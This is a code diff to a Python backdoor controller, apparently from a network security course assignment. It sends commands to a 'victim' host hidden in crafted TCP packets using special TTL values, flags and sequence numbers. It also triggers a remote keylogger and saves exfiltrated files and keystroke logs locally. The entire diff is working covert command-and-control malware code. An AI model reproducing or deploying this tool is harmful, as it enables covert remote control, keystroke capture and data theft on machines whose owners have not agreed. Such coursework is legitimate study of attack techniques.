@@ -5,6 +5,7 @@ import os.path
 import subprocess
 import sys
 import time
+from packetutil import *
 from bkutil import *
 from multiprocessing import Process
 from cryptoutil import encrypt, decrypt
@@ -17,25 +18,19 @@ import setproctitle
 Setup: pip3 install pycryptodome setproctitle scapy watchdog3
 """
 
-TTL = 222
-TTLKEY = 234
-
 # parse command line argument
 arg_parser = argparse.ArgumentParser(
     prog='Backdoor',
     description='COMP 8505 Final Assignment by Peyman Tehrani Parsa & Khang Tran'
 )
 arg_parser.add_argument('-p', dest='port', type = int, help = 'victim PORT', default=8888, const=8888, nargs='?')
-arg_parser.add_argument('-i', dest='ip', type = str, help = 'victim IP')
+arg_parser.add_argument('-i', dest='ip', type = str, help = 'victim IP', required=True)
 args = arg_parser.parse_args()
 
+TTL = 222
+TTLKEY = 234
 victim = (args.ip, args.port)
 messages = []
-authentication = "1337"
-setFlag = "E"
-
-myip = ("192.168.0.3", 66)
-
 
 def secret_send(msg: str, type: str = 'command'):
     """
@@ -43,62 +38,13 @@ def secret_send(msg: str, type: str = 'command'):
     msg      - payload being sent
     type     - file or command (default:command)
     """
+
+    msg = message_to_bits(msg)
+    chunks = message_spliter(msg)
+    packets = packatizer(chunks,TTL,victim)
+    send(packets, verbose=True)
     if(type == "command"):
-        # Convert message from ASCII to bits
-        msg = message_to_bits(msg)
-        chunks = message_spliter(msg)
-        packets = packatizer(chunks)
-        send(packet, verbose=True)
-
-
-def packatizer(msg):
-    """[summary]
-
-    Arguments:
-        msg {[type]} -- [description]
-
-    Returns:
-        [list of scapy.packets] -- [description]
-    """
-
-    # Create the packets array as a placeholder.
-    packets = []
-    # If the length of the number is larger than what is allowed in one packet, split it
-    counter = 0
-
-    # If not an array (if there is only one packet.)
-    if(type(msg) is str):
-        packets.append(craft(msg))
-    # If an array (if there is more than one packet)
-    elif(type(msg) is list):
-        while (counter < len(msg)):
-            # The position will be the array element and the total will be the
-            # length.
-            # i.e. 1/3 messages to send.
-            packets.append(craft(msg[counter]))
-            counter = counter + 1
-    packets.append(IP(dst=victim[0], ttl=TTL) /
-                   TCP(sport=myip[1], dport=victim[1], flags="U"))
-    return packets
-
-
-def craft(data: str) -> IP:
-    """[summary]
-
-    Arguments:
-        data {str} -- [description]
-
-    Returns:
-        IP -- [description]
-    """
-
-    global TTL
-    global setFlag
-    # The payload contains the unique password, UID, position number and total.
-    packet = IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1], dport=victim[1],
-                                            seq=int(str(data), 2), flags=setFlag)
-    return packet
-
+        send(IP(dst=victim[0], ttl=TTL)/TCP(dport=victim[1], flags="U"))
 
 def server():
     """[summary]
@@ -107,7 +53,7 @@ def server():
     while True:
         try:
             # Prompt user for the command they would like to execute on the backdoor.
-            command = input("ENTER COMMAND: {}:".format(victim[0]))
+            command = input("\033[92m{} READY\033[0m\n".format(victim[0]))
         except EOFError as e:
             print(e)
         # Print the command so that the user knows what they typed.
@@ -116,8 +62,7 @@ def server():
         if(command == "exit"):
             sys.exit()
         elif(command == "keylog"):
-            send(IP(dst=victim[0], ttl=TTL) /
-                           TCP(sport=myip[1], dport=victim[1], flags="P"))
+            send(IP(dst=victim[0], ttl=TTL)/TCP(dport=victim[1], flags="P"))
         else:
             secret_send(command)
 
@@ -147,12 +92,19 @@ def commandResult(packet):
             print('\n', payload)
             messages = []
         elif flag == 0x08:
-            log_file = '/root/Documents/temp/file.log'
+            load = packet[TCP].load
+            file_name = decrypt(load)
+            if(file_name == "file.log"):
+                print(" Keystroke Log File Extracted into /root/Documents/temp --> {}".format(file_name))
+            else:
+                print(" File Name --> {} --> was created. Check /root/Documents/temp".format(file_name))
             #checks if log file exists in specific directory
-            if os.path.isfile(log_file):
-                os.remove(log_file)
-            with open(log_file, 'w+') as f:
+            file_directory = "/root/Documents/temp/{}".format(file_name)
+            if os.path.isfile(file_directory):
+                os.remove(file_directory)
+            with open(file_directory, 'w+') as f:
                 f.write('{}'.format(str(''.join(messages)[2:-2]).replace("\\n", '\n')))
+            messages = []
 
 
 def commandSniffer():
